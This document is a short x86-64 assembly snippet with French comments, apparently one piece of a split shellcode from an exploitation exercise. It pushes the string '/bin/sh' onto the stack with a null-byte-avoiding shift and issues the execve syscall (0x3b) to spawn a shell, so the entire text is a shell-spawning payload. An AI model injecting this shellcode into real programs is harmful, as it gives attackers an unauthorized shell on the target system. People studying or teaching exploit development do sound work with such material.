global _start
section .text
_start:
  ; On simule piece2
  mov rdi, "//bin/sh"
  shr rdi, 8
  ; jump rel
  xor rsi, rsi
  push rsi
  push rdi
  mov rdi, rsp
  mov al, 0x3b
  syscall

